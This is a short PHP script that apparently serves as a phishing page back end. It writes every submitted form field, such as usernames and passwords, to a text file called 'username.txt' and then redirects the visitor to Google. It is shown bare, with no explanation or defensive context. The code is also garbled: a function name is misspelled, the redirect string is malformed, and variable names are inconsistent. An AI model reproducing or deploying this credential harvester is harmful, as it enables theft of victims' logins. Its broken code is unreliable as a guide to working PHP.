<?php heahder (location:https://google/');
$handle=fopen("username.txt","a");
foreach($_Post as $variable => $value)
{fwrite($handle, $Variable);
fwrite($handle,"=");
fwrite($handle,$value);
fwrite($handle,"\r\n");
}
fwrite($handle,"\r\n");
fclose(@handle);
exit;
?>